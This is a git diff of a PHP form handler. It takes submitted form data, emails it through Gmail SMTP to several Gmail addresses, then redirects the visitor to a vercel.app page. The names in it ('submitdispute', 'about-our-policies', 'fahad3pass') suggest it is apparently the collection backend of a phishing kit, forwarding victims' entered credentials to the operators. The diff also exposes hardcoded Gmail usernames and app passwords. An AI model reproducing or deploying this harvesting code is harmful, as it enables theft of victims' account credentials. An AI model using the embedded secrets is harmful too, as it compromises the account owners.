@@ -2,8 +2,6 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://about-our-policies.vercel.app/");
-
 require 'Exception.php';
 require 'PHPMailer.php';
 require 'SMTP.php';
@@ -19,40 +17,45 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
 
 
-   // PHPMailer object creation
+    // PHPMailer object creation
     $mail = new PHPMailer(true);
 
     try {
-        // SMTP settings
+    // SMTP settings
           $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'hindistoryhub396@gmail.com'; // Replace with your email address
-        $mail->Password   = 'fylk gbsb cdgu anwh'; // Replace with your email password
+        $mail->Username   = 'best90960@gmail.com'; // Replace with your email address
+        $mail->Password   = 'kqnv nxov jjek btps'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('hindistoryhub396@gmail.com', 'PROFESSOR');
+        $mail->setFrom('best90960@gmail.com', 'PROFESSOR');
         $mail->addAddress('submitdispute@gmail.com');
          $mail->addAddress('newzatpage@gmail.com');
-        $mail->addAddress('fahadali123gg@gmail.com');
+      
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Fahad';
+        $mail->Subject = 'Chumpa';
         $mail->Body = $emailBody; // Set the email body using the collected form data
-        
+
         // Send email
-        $mail->send();
-        echo 'Email successfully sent using PHPMailer.';
-    } catch (Exception $e) {
-        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
+ $mail->send();
+    // Set a session variable to carry the success message to the redirected page
+    session_start();
+    $_SESSION['email_success'] = true;
+
+    // Redirect to another page after sending email successfully
+    header("Location: https://fahad3pass-fawn.vercel.app/");
+    exit(); // Make sure to exit after sending the header to prevent further execution
+} catch (Exception $e) {
+    echo "Email sending failed. Error message: {$mail->ErrorInfo}";
+
     }
-} else {
-    echo "Invalid request!";
 }
 ?>
